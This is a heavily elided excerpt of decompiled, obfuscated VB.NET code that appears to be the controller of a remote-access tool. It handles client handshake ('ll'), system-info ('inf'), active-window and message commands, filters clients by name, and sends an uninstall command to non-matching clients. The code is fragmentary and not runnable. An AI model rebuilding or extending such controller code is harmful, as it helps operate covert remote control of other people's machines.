...
Friend NotInheritable Class Class7
    ...
    Public Shared Sub smethod_5(object_0 As Object)
        ...
        '如果是判断activeWindow就直接返回
        If Operators.CompareString(strArray1(0), "act", False) = 0 Then
            Return
        End If
        If strArray1(0) = "ll" Then
            Dim client_name As String = DirectCast(Class6.smethod_16(strArray1(1)), String)
            If InStr(client_name, GVars.client_name_filter) = 0 Then
                client_0.Send(Class6.smethod_11(("un" & Class7.string_1 & "!")))
                sk_0.Online.Remove(client_0.ip())
                Return
            End If
        End If
        Try
...
label_106:
            ...
            ElseIf Operators.CompareString(Left1, "inf", False) = 0 Then
                ...
                End While
                client_0.L.Cells(0).ToolTipText = String.Format(format, DirectCast("Name", Object), DirectCast("Host", Object), DirectCast("Dir", Object), DirectCast("Exe", Object), DirectCast("Copy", Object),
            ...
            Else
                    ...
                    If Operators.CompareString(Left1, "ll", False) <> 0 Then
                        ...
                        ElseIf Operators.CompareString(Left1, "MSG", False) = 0 Then
                            If Not Class7.class8_0.bool_5 Then
                                Return
                            End If
                            Class7.form1_0.Pp1.WRT(New Object(11) {DirectCast(Color.LightSteelBlue, Object), DirectCast(Class6.smethod_13(), Object), DirectCast(Color.DarkSlateBlue, Object), DirectCast(client_0.COI, Object), DirectCast(client_0.ip(), Object), DirectCast(Color.SteelBlue, Object),
                ...
                If Class7.class8_0.bool_1 Then
                    Class7.form1_0.Pp1.WRT(New Object(8) {DirectCast(Color.LightSteelBlue, Object), DirectCast(Class6.smethod_13(), Object), DirectCast(Color.DarkSlateBlue, Object), DirectCast(client_0.COI, Object), DirectCast(client_0.ip(), Object), DirectCast(Color.SteelBlue, Object),
        ...
        Catch ex1 As Exception
            ...
            Else
                ...
                If Class7.class8_0.bool_3 Then
                    Class7.form1_0.Pp1.WRT(New Object(9) {DirectCast(Color.LightSteelBlue, Object), DirectCast(Class6.smethod_13(), Object), DirectCast(Color.BlueViolet, Object), DirectCast("Listner", Object), DirectCast(Color.DarkRed, Object), DirectCast("ERR AT ", Object),
